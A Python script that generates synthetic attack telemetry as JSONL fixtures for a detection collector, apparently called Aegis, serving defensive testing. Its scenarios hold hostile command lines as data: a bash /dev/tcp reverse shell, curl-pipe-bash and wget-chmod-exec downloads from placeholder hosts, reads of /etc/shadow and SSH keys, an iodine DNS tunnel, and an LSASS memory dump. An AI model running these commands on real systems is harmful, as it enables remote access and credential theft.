#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, List


def utc_iso(base: datetime, offset_seconds: int = 0) -> str:
	ts = base + timedelta(seconds=offset_seconds)
	return ts.strftime("%Y-%m-%dT%H:%M:%SZ")


def make_process_guid(host: str, pid: int) -> str:
	return f"{host}-proc-{pid}"


def process_start_event(
	*,
	ts: str,
	process_guid: str,
	pid: int,
	ppid: int,
	uid: int,
	user_name: str,
	name: str,
	exe: str,
	cmdline: str,
) -> Dict[str, object]:
	return {
		"kind": "process_start",
		"ts": ts,
		"process_guid": process_guid,
		"pid": pid,
		"ppid": ppid,
		"uid": uid,
		"user_name": user_name,
		"name": name,
		"exe": exe,
		"cmdline": cmdline,
		"process_start_time": ts,
	}


def network_connect_event(
	*,
	ts: str,
	pid: int,
	process_guid: str,
	dst_ip: str,
	dst_port: int,
	src_ip: str = "10.0.2.15",
	src_port: int = 50122,
	protocol: str = "tcp",
	direction: str = "outbound",
) -> Dict[str, object]:
	return {
		"kind": "network_connect",
		"ts": ts,
		"pid": pid,
		"process_guid": process_guid,
		"protocol": protocol,
		"src_ip": src_ip,
		"src_port": src_port,
		"dst_ip": dst_ip,
		"dst_port": dst_port,
		"direction": direction,
	}


def file_open_event(
	*,
	ts: str,
	pid: int,
	process_guid: str,
	user_name: str,
	path: str,
	flags: List[str],
	result: str = "success",
) -> Dict[str, object]:
	return {
		"kind": "file_open",
		"ts": ts,
		"pid": pid,
		"process_guid": process_guid,
		"user_name": user_name,
		"path": path,
		"flags": flags,
		"result": result,
	}


def auth_failure_event(
	*,
	ts: str,
	user_name: str,
	method: str,
	src_ip: str,
	reason: str,
) -> Dict[str, object]:
	return {
		"kind": "auth_failure",
		"ts": ts,
		"user_name": user_name,
		"method": method,
		"src_ip": src_ip,
		"reason": reason,
	}


def _temp_dir_path(*parts: str) -> str:
	return "/tmp/" + "/".join(part.strip("/") for part in parts if part)


def scenario_reverse_shell(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 1732
	guid = make_process_guid(host, pid)
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=1120,
			uid=1000,
			user_name=user,
			name="bash",
			exe="/usr/bin/bash",
			cmdline="bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'",
		),
		network_connect_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			dst_ip="198.51.100.10",
			dst_port=4444,
		),
	]


def scenario_auth_burst(
	base: datetime,
	src_ip: str,
	attempts: int,
	user_name: str = "admin",
	method: str = "ssh",
	reason: str = "invalid_password",
) -> List[Dict[str, object]]:
	events: List[Dict[str, object]] = []
	total = max(attempts, 1)
	for idx in range(total):
		events.append(
			auth_failure_event(
				ts=utc_iso(base, idx),
				user_name=user_name,
				method=method,
				src_ip=src_ip,
				reason=reason,
			)
		)
	return events


def scenario_port_scan(base: datetime, host: str, dst_ip: str) -> List[Dict[str, object]]:
	pid = 2901
	guid = make_process_guid(host, pid)
	ports = [22, 80, 443, 445, 3389, 5985, 5986, 8080, 8444, 9001, 1337, 31337]
	events: List[Dict[str, object]] = [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=2020,
			uid=1000,
			user_name="alice",
			name="nmap",
			exe="/usr/bin/nmap",
			cmdline=f"nmap -Pn -p {','.join(str(p) for p in ports)} {dst_ip}",
		)
	]
	for idx, port in enumerate(ports, start=1):
		events.append(
			network_connect_event(
				ts=utc_iso(base, idx),
				pid=pid,
				process_guid=guid,
				dst_ip=dst_ip,
				dst_port=port,
			)
		)
	return events


def scenario_temp_dropper(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 4112
	guid = make_process_guid(host, pid)
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=3001,
			uid=1000,
			user_name=user,
			name="curl",
			exe="/usr/bin/curl",
			cmdline="curl -s https://example.invalid/dropper.bin -o /tmp/dropper.bin",
		),
		file_open_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			user_name=user,
			path="/tmp/dropper.bin",
			flags=["O_CREAT", "O_WRONLY"],
			result="success",
		),
	]


def scenario_data_staging(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 5220
	guid = make_process_guid(host, pid)
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=2050,
			uid=1000,
			user_name=user,
			name="tar",
			exe="/usr/bin/tar",
			cmdline="tar -czf /tmp/stage-home.tgz /home/alice /var/log",
		),
		file_open_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			user_name=user,
			path="/tmp/stage-home.tgz",
			flags=["O_CREAT", "O_WRONLY"],
			result="success",
		),
	]


def scenario_sensitive_file_enum(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 5334
	guid = make_process_guid(host, pid)
	paths = ["/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa"]
	events: List[Dict[str, object]] = [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=2048,
			uid=0,
			user_name=user,
			name="cat",
			exe="/usr/bin/cat",
			cmdline="cat /etc/passwd /etc/shadow /root/.ssh/id_rsa",
		)
	]
	for idx, path in enumerate(paths, start=1):
		events.append(
			file_open_event(
				ts=utc_iso(base, idx),
				pid=pid,
				process_guid=guid,
				user_name=user,
				path=path,
				flags=["O_RDONLY"],
				result="success",
			)
		)
	return events


def scenario_download_pipe_bash(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 6121
	guid = make_process_guid(host, pid)
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=3001,
			uid=1000,
			user_name=user,
			name="bash",
			exe="/usr/bin/bash",
			cmdline="bash -lc 'curl -fsSL https://cdn.example.invalid/bootstrap.sh | bash'",
		),
		network_connect_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			dst_ip="198.51.100.44",
			dst_port=443,
		),
	]


def scenario_download_chmod_exec(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 6401
	guid = make_process_guid(host, pid)
	tmp_path = _temp_dir_path(".cache", "agent-update")
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=3001,
			uid=1000,
			user_name=user,
			name="bash",
			exe="/usr/bin/bash",
			cmdline=f"bash -lc 'wget -q https://cdn.example.invalid/a.sh -O {tmp_path}; chmod +x {tmp_path}; {tmp_path} --daemon'",
		),
		file_open_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			user_name=user,
			path=tmp_path,
			flags=["O_CREAT", "O_WRONLY"],
			result="success",
		),
	]


def scenario_tmp_interpreter_exec(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 7003
	guid = make_process_guid(host, pid)
	exe = _temp_dir_path(".systemd-cache", "python3")
	script_path = _temp_dir_path(".systemd-cache", "loader.py")
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=1777,
			uid=1000,
			user_name=user,
			name="python3",
			exe=exe,
			cmdline=f"{exe} {script_path} --stage beacon",
		),
		file_open_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			user_name=user,
			path=script_path,
			flags=["O_RDONLY"],
			result="success",
		),
	]


def scenario_dns_tunnel_tool(base: datetime, host: str, user: str, dst_ip: str) -> List[Dict[str, object]]:
	pid = 7331
	guid = make_process_guid(host, pid)
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=2210,
			uid=1000,
			user_name=user,
			name="iodine",
			exe="/usr/bin/iodine",
			cmdline="iodine -f -P demo-pass tunnel.example.invalid",
		),
		network_connect_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			dst_ip=dst_ip,
			dst_port=53,
			protocol="udp",
		),
	]


def scenario_lsass_dump(base: datetime, host: str, user: str) -> List[Dict[str, object]]:
	pid = 4812
	guid = make_process_guid(host, pid)
	return [
		process_start_event(
			ts=utc_iso(base, 0),
			process_guid=guid,
			pid=pid,
			ppid=944,
			uid=0,
			user_name=user,
			name="rundll32.exe",
			exe="C:\\Windows\\System32\\rundll32.exe",
			cmdline="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 628 C:\\Windows\\Temp\\lsass.dmp full",
		),
		file_open_event(
			ts=utc_iso(base, 1),
			pid=pid,
			process_guid=guid,
			user_name=user,
			path="C:\\Windows\\System32\\lsass.exe",
			flags=["PROCESS_VM_READ", "access=0x1410"],
			result="success",
		),
	]


def scenario_full(base: datetime, host: str, user: str, src_ip: str, dst_ip: str, attempts: int) -> List[Dict[str, object]]:
	events: List[Dict[str, object]] = []
	events.extend(scenario_reverse_shell(base, host, user))
	events.extend(scenario_temp_dropper(base + timedelta(seconds=10), host, user))
	events.extend(scenario_data_staging(base + timedelta(seconds=20), host, user))
	events.extend(scenario_auth_burst(base + timedelta(seconds=30), src_ip, max(6, attempts)))
	events.extend(scenario_port_scan(base + timedelta(seconds=45), host, dst_ip))
	return events


def build_events(args: argparse.Namespace) -> List[Dict[str, object]]:
	base = datetime.now(timezone.utc)

	if args.scenario == "reverse_shell":
		return scenario_reverse_shell(base, args.host, args.user)
	if args.scenario == "auth_burst":
		return scenario_auth_burst(base, args.src_ip, args.attempts)
	if args.scenario == "port_scan":
		return scenario_port_scan(base, args.host, args.dst_ip)
	if args.scenario == "temp_dropper":
		return scenario_temp_dropper(base, args.host, args.user)
	if args.scenario == "data_staging":
		return scenario_data_staging(base, args.host, args.user)
	if args.scenario == "sensitive_file_enum":
		return scenario_sensitive_file_enum(base, args.host, args.user)
	if args.scenario == "download_pipe_bash":
		return scenario_download_pipe_bash(base, args.host, args.user)
	if args.scenario == "download_chmod_exec":
		return scenario_download_chmod_exec(base, args.host, args.user)
	if args.scenario == "tmp_interpreter_exec":
		return scenario_tmp_interpreter_exec(base, args.host, args.user)
	if args.scenario == "dns_tunnel_tool":
		return scenario_dns_tunnel_tool(base, args.host, args.user, args.dst_ip)
	if args.scenario == "lsass_dump":
		return scenario_lsass_dump(base, args.host, args.user)
	return scenario_full(base, args.host, args.user, args.src_ip, args.dst_ip, args.attempts)


def write_jsonl(events: List[Dict[str, object]], output_path: str, pretty: bool) -> None:
	lines = []
	for ev in events:
		if pretty:
			lines.append(json.dumps(ev, ensure_ascii=False, indent=2))
		else:
			lines.append(json.dumps(ev, ensure_ascii=False, separators=(",", ":")))

	payload = "\n".join(lines) + "\n"

	if output_path == "-":
		print(payload, end="")
		return

	out = Path(output_path)
	out.parent.mkdir(parents=True, exist_ok=True)
	out.write_text(payload, encoding="utf-8")
	print(f"Wrote {len(events)} events to {out}")


def parse_args() -> argparse.Namespace:
	parser = argparse.ArgumentParser(description="Attack simulation event generator for Aegis collector fixture input")
	parser.add_argument(
		"--scenario",
		choices=[
			"full",
			"reverse_shell",
			"auth_burst",
			"port_scan",
			"temp_dropper",
			"data_staging",
			"sensitive_file_enum",
			"download_pipe_bash",
			"download_chmod_exec",
			"tmp_interpreter_exec",
			"dns_tunnel_tool",
			"lsass_dump",
		],
		default="full",
		help="Attack simulation scenario",
	)
	parser.add_argument("--output", default="-", help="Output path for JSONL ('-' for stdout)")
	parser.add_argument("--host", default="lab-host", help="Host label used in generated process_guid")
	parser.add_argument("--user", default="alice", help="Username used in generated events")
	parser.add_argument("--src-ip", dest="src_ip", default="203.0.113.77", help="Source IP for auth events")
	parser.add_argument("--dst-ip", dest="dst_ip", default="198.51.100.10", help="Destination IP for network scenarios")
	parser.add_argument("--attempts", type=int, default=6, help="Auth attempts for auth_burst scenario")
	parser.add_argument("--pretty", action="store_true", help="Pretty-print JSON output")
	return parser.parse_args()


def main() -> None:
	args = parse_args()
	events = build_events(args)
	write_jsonl(events, args.output, args.pretty)


if __name__ == "__main__":
	main()